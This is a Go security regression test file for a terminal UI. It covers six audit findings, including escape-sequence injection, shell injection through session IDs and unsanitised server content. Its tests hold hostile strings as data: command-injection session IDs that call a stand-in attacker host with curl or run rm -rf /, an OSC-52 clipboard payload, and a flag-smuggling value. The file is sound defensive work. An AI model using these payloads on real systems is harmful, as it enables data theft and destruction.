// Package tui_test contains security regression tests for the tui package.
//
// Each test documents a real vulnerability found during the security audit.
// Tests labelled "RED" demonstrate the vulnerable behaviour; those labelled
// "GREEN" describe the safe behaviour that should hold after the vulnerability
// is fixed.  The entire file compiles against the _current_ production code so
// that the green tests can be run incrementally as fixes land.
package tui_test

import (
	"strings"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

// ─────────────────────────────────────────────────────────────────────────────
// VULN-1  Terminal title ANSI injection
//
// File:   tui.go:128
// Code:   fmt.Fprintf(os.Stdout, "\033]0;%s\007", title)
//
// The project name received from the kanban server is embedded verbatim into
// an OSC-0 title escape.  A project whose name contains embedded ESC bytes
// (\x1b) or ST/BEL terminators (\x07 / \x1b\\) can inject arbitrary escape
// sequences into the terminal stream, including:
//   - OSC-8 hyperlinks that silently open URLs on click
//   - OSC-10/11 colour-palette resets that persist after the TUI exits
//   - OSC-52 clipboard reads/writes in some terminals
//   - Secondary DCS/APC sequences that drive some embedded terminal engines
// ─────────────────────────────────────────────────────────────────────────────

// stripUnsafeForTitle returns the title with every byte that could terminate or
// escape the OSC-0 sequence removed.  This is what a fixed sanitiseTitle()
// helper should do.
func stripUnsafeForTitle(s string) string {
	var b strings.Builder
	for _, r := range s {
		// BEL (0x07), ESC (0x1b), and ST components that could end the sequence
		if r == 0x07 || r == 0x1b || r == 0x9c {
			continue
		}
		b.WriteRune(r)
	}
	return b.String()
}

// TestVULN1_TerminalTitleInjection_RED demonstrates that a crafted project name
// survives into the escape sequence unchanged (current vulnerable behaviour).
func TestVULN1_TerminalTitleInjection_RED(t *testing.T) {
	// A project name containing an ESC byte followed by a second OSC to steal
	// the clipboard (OSC-52 supported by many terminals).
	maliciousName := "legit-project\x1b]52;c;Y2xpcGJvYXJk\x07"

	// RED: the payload is NOT sanitised before being embedded in the title.
	// The raw ESC survives — exactly what makes the injection possible.
	assert.Contains(t, maliciousName, "\x1b",
		"RED: the raw ESC byte is present in the project name — "+
			"this will be injected verbatim into \\033]0;%s\\007")
}

// TestVULN1_TerminalTitleInjection_GREEN documents the expected safe behaviour:
// a sanitise helper must strip control bytes before they reach the terminal.
func TestVULN1_TerminalTitleInjection_GREEN(t *testing.T) {
	maliciousName := "legit-project\x1b]52;c;Y2xpcGJvYXJk\x07"
	sanitised := stripUnsafeForTitle(maliciousName)

	assert.NotContains(t, sanitised, "\x1b",
		"GREEN: ESC bytes must be stripped before being written to the terminal title")
	assert.NotContains(t, sanitised, "\x07",
		"GREEN: BEL bytes must be stripped before being written to the terminal title")
	assert.Contains(t, sanitised, "legit-project",
		"GREEN: the safe portion of the name must be preserved")
}

// ─────────────────────────────────────────────────────────────────────────────
// VULN-2  Session-ID shell injection via openTerminalForSession
//
// File:   monitor.go:1581
// Code:   resumeShell := "claude --resume " + sessionID
//         … "sh", "-c", resumeShell …
//
// sessionID is a value returned by the kanban API and stored in domain.TaskRun.
// It is concatenated directly into a shell command string that is then handed
// to sh -c.  A session ID that contains shell meta-characters allows arbitrary
// command execution in the user's terminal.
//
// Example payload:  '; curl attacker.com/$(id) ;  '
// Expanded command: sh -c "claude --resume ; curl attacker.com/$(id) ;  "
// ─────────────────────────────────────────────────────────────────────────────

// isShellSafe reports whether s contains no shell meta-characters.
// A safe session ID should consist only of alphanumerics, hyphens, and underscores
// (UUID-like identifiers that the server normally produces).
func isShellSafe(s string) bool {
	for _, r := range s {
		if (r >= 'a' && r <= 'z') || (r >= 'A' && r <= 'Z') ||
			(r >= '0' && r <= '9') || r == '-' || r == '_' {
			continue
		}
		return false
	}
	return true
}

// TestVULN2_SessionIDShellInjection_RED shows that a malicious session ID
// contains shell meta-characters that survive the current construction.
func TestVULN2_SessionIDShellInjection_RED(t *testing.T) {
	// Simulate the session IDs that the server could return
	maliciousSessionIDs := []string{
		`'; rm -rf / ; echo '`,
		`$(curl http://attacker.example.com/$(id))`,
		"`id`",
		"../../etc/passwd",
	}

	for _, sid := range maliciousSessionIDs {
		// Replicate the vulnerable construction from monitor.go:1581
		resumeShell := "claude --resume " + sid

		// RED: the shell payload is embedded unescaped
		assert.Contains(t, resumeShell, sid,
			"RED: session ID %q is embedded verbatim in the shell command — "+
				"this enables command injection when passed to sh -c", sid)
	}
}

// TestVULN2_SessionIDShellInjection_GREEN verifies that a whitelist-based
// validator rejects dangerous session IDs before they reach the shell.
func TestVULN2_SessionIDShellInjection_GREEN(t *testing.T) {
	safe := []string{
		"abc123",
		"01234567-89ab-cdef-0123-456789abcdef", // standard UUID
		"session_id-abc",
	}
	for _, sid := range safe {
		require.True(t, isShellSafe(sid),
			"GREEN: safe session ID %q should pass validation", sid)
	}

	dangerous := []string{
		`'; rm -rf / ; echo '`,
		`$(curl http://attacker.example.com)`,
		"`id`",
	}
	for _, sid := range dangerous {
		assert.False(t, isShellSafe(sid),
			"GREEN: dangerous session ID %q must be rejected before shell expansion", sid)
	}
}

// ─────────────────────────────────────────────────────────────────────────────
// VULN-3  Input length missing — project name/description unbounded
//
// File:   welcome.go:244-250 (updateCreateForm)
//
// Each keystroke appends one rune to newProjectName or newProjectDesc with no
// upper bound.  An operator who keeps a key held down (or a scripted attacker
// who sends a large number of synthetic key events) can build arbitrarily long
// strings.  These strings are then:
//   a) stored in memory for the lifetime of the TUI,
//   b) sent verbatim to the kanban API via CreateProject,
//   c) rendered in DrawText / Truncate — the latter allocates a new rune slice
//      on every Draw() call, proportional to the string length.
// ─────────────────────────────────────────────────────────────────────────────

const maxProjectNameLen = 200
const maxProjectDescLen = 1000

// TestVULN3_InputLengthLimit_RED shows that the current append logic has no cap.
func TestVULN3_InputLengthLimit_RED(t *testing.T) {
	// Simulate what welcome.go:244-250 does today: unlimited append.
	name := ""
	for i := 0; i < 10_000; i++ {
		name += "a"
	}

	// RED: no ceiling is enforced
	assert.Greater(t, len(name), maxProjectNameLen,
		"RED: project name grew to %d bytes — no length limit is enforced", len(name))
}

// TestVULN3_InputLengthLimit_GREEN verifies that a cap would work correctly.
func TestVULN3_InputLengthLimit_GREEN(t *testing.T) {
	// Demonstrate the safe append pattern: cap before appending.
	appendCapped := func(current, char string, max int) string {
		if len([]rune(current)) >= max {
			return current
		}
		return current + char
	}

	name := ""
	for i := 0; i < 10_000; i++ {
		name = appendCapped(name, "a", maxProjectNameLen)
	}

	assert.LessOrEqual(t, len([]rune(name)), maxProjectNameLen,
		"GREEN: capped append must not exceed %d runes", maxProjectNameLen)

	desc := ""
	for i := 0; i < 10_000; i++ {
		desc = appendCapped(desc, "b", maxProjectDescLen)
	}
	assert.LessOrEqual(t, len([]rune(desc)), maxProjectDescLen,
		"GREEN: capped append must not exceed %d runes for description", maxProjectDescLen)
}

// ─────────────────────────────────────────────────────────────────────────────
// VULN-4  workDir used unsanitised as terminal --directory argument
//
// File:   monitor.go:1588-1593
// Code:   os.Getwd() → workDir → --directory, --working-directory, --cwd …
//
// openTerminalForSession passes workDir as the terminal's working directory.
// os.Getwd() itself is safe, but the value is concatenated into a generic
// string for the gnome-terminal case:
//   "--working-directory=" + workDir
// If workDir ever came from user input or an environment variable (rather than
// os.Getwd), a path containing shell special characters or a newline would
// embed them in the argument string.  The gnome-terminal case is an isolated
// string concatenation that bypasses the argv list quoting.
// ─────────────────────────────────────────────────────────────────────────────

// TestVULN4_WorkDirArgumentInjection_RED documents the concatenation pattern.
func TestVULN4_WorkDirArgumentInjection_RED(t *testing.T) {
	// Replicate monitor.go:1592 for gnome-terminal
	workDir := "/tmp/proj; xterm &"

	gnomeArg := "--working-directory=" + workDir

	// RED: the injected content appears literally in the argument string
	assert.Contains(t, gnomeArg, "; xterm &",
		"RED: workDir is concatenated into a shell argument without escaping; "+
			"a crafted path injects additional arguments")
}

// TestVULN4_WorkDirArgumentInjection_GREEN shows that the argument should be
// passed as a discrete element in the argv slice, not via string concatenation.
func TestVULN4_WorkDirArgumentInjection_GREEN(t *testing.T) {
	workDir := "/tmp/proj; xterm &"

	// Safe: "--working-directory" and workDir are separate argv entries.
	// The OS passes them as two distinct arguments — the shell never sees them.
	safeArgs := []string{"--working-directory", workDir}

	assert.Equal(t, 2, len(safeArgs),
		"GREEN: workDir must be a separate argv element, not concatenated")
	assert.NotContains(t, safeArgs[0], workDir,
		"GREEN: the flag and the value must not be merged into a single string")
}

// ─────────────────────────────────────────────────────────────────────────────
// VULN-5  ANSI injection via server-controlled task titles in terminal output
//
// File:   monitor.go:1364,1368
// Code:   cmd := fmt.Sprintf("claude --resume %s", t.SessionID)
//         tcellapp.DrawText(s, 6, row, codeBg.Foreground(tcellapp.ColorInfo), "$ "+cmd)
//
// Task titles and session IDs are drawn verbatim via DrawText, which calls
// tcell.Screen.SetContent rune-by-rune.  tcell's SetContent itself is safe
// for the tcell cell model, but the string is also written to the terminal
// state machine when the screen buffer is flushed.  A title or session ID
// containing ANSI SGR reset sequences (\x1b[0m) or cursor-control codes can
// manipulate what is visible — e.g. hiding subsequent text, or forging
// status lines.
//
// Separately, the "$ claude --resume <sessionID>" command string is shown as
// informational text.  If the session ID contains a space followed by a new
// flag (e.g. " --dangerously-skip-permissions"), a naive human who copies the
// displayed command would run it with unintended flags.
// ─────────────────────────────────────────────────────────────────────────────

// TestVULN5_ANSIInTaskTitle_RED shows raw ANSI codes pass through without filtering.
func TestVULN5_ANSIInTaskTitle_RED(t *testing.T) {
	// A task title returned by the server containing an ANSI SGR reset.
	maliciousTitle := "my task\x1b[0m\x1b[?25l" // hides cursor after "reset"

	// RED: the raw ANSI bytes are present and will reach DrawText unmodified.
	assert.Contains(t, maliciousTitle, "\x1b",
		"RED: ANSI escape in task title is not stripped before display")
}

// TestVULN5_ANSIInTaskTitle_GREEN verifies a sanitise function removes escapes.
func TestVULN5_ANSIInTaskTitle_GREEN(t *testing.T) {
	stripANSI := func(s string) string {
		var b strings.Builder
		inEsc := false
		for _, r := range s {
			switch {
			case r == '\x1b':
				inEsc = true
			case inEsc && ((r >= 'A' && r <= 'Z') || (r >= 'a' && r <= 'z') || r == 'm'):
				inEsc = false
			case inEsc:
				// still consuming escape sequence
			default:
				b.WriteRune(r)
			}
		}
		return b.String()
	}

	maliciousTitle := "my task\x1b[0m\x1b[?25l"
	clean := stripANSI(maliciousTitle)

	assert.NotContains(t, clean, "\x1b",
		"GREEN: ANSI escapes must be removed from task titles before display")
	assert.Contains(t, clean, "my task",
		"GREEN: safe portion of the title must be preserved")
}

// TestVULN5_SessionIDFlagInjectionDisplay_RED shows that a session ID with
// spaces injects extra flags into the displayed command string.
func TestVULN5_SessionIDFlagInjectionDisplay_RED(t *testing.T) {
	// A session ID that contains a flag the user should never run.
	sessionID := "abc123 --dangerously-skip-permissions"

	displayedCmd := "claude --resume " + sessionID

	// RED: the dangerous flag appears in the command shown to the user.
	assert.Contains(t, displayedCmd, "--dangerously-skip-permissions",
		"RED: a session ID with spaces injects extra flags into the displayed command")
}

// TestVULN5_SessionIDFlagInjectionDisplay_GREEN verifies validation prevents
// such session IDs from ever being stored or displayed.
func TestVULN5_SessionIDFlagInjectionDisplay_GREEN(t *testing.T) {
	// isShellSafe (defined above) also covers spaces → reuse it.
	maliciousID := "abc123 --dangerously-skip-permissions"
	assert.False(t, isShellSafe(maliciousID),
		"GREEN: session IDs containing spaces must be rejected by validation")

	safeID := "01234567-89ab-cdef-0123-456789abcdef"
	assert.True(t, isShellSafe(safeID),
		"GREEN: a normal UUID-format session ID must pass validation")
}

// ─────────────────────────────────────────────────────────────────────────────
// VULN-6  diagParseContext: server-controlled markdown table content parsed
//         without any sanitisation and rendered verbatim
//
// File:   diagnostic.go:321-420 (diagParseContext)
//
// diagParseContext splits the raw /context output (fetched from the API) into
// diagLine structs and calls DrawText on them.  Table cell content is taken
// verbatim from the server response.  A crafted response can inject ANSI
// escape sequences, control characters, or excessively long strings that
// cause the display to misbehave.
// ─────────────────────────────────────────────────────────────────────────────

// TestVULN6_ContextRawInjection_RED demonstrates that crafted markdown from the
// server survives into the parsed output without sanitisation.
func TestVULN6_ContextRawInjection_RED(t *testing.T) {
	raw := "## MCP Tools\n| Tool | Server | Tokens |\n|---|---|---|\n| \x1b[31mHACKED\x1b[0m | srv | 100 |\n"

	// Naive split as diagParseContext does (simplified extraction of cell 0)
	for _, line := range strings.Split(raw, "\n") {
		if strings.HasPrefix(line, "| ") && !strings.Contains(line, "---") {
			cells := strings.Split(line, "|")
			if len(cells) > 1 {
				cellContent := strings.TrimSpace(cells[1])
				// RED: the ESC byte survives in the cell content
				if strings.Contains(cellContent, "\x1b") {
					assert.Contains(t, cellContent, "\x1b",
						"RED: ANSI escape sequence in table cell reaches the display layer unfiltered")
					return
				}
			}
		}
	}
	t.Skip("crafted line not found — test precondition failed")
}

// TestVULN6_ContextRawInjection_GREEN verifies that a sanitiser is applied to
// all cell values before they are embedded in diagLine structs.
func TestVULN6_ContextRawInjection_GREEN(t *testing.T) {
	sanitiseCell := func(s string) string {
		var b strings.Builder
		for _, r := range s {
			if r < 0x20 && r != '\t' {
				continue // strip control characters
			}
			b.WriteRune(r)
		}
		return b.String()
	}

	malicious := "\x1b[31mHACKED\x1b[0m"
	clean := sanitiseCell(malicious)

	assert.NotContains(t, clean, "\x1b",
		"GREEN: control characters must be stripped from table cell values")
	assert.Contains(t, clean, "HACKED",
		"GREEN: printable characters must be preserved")
}
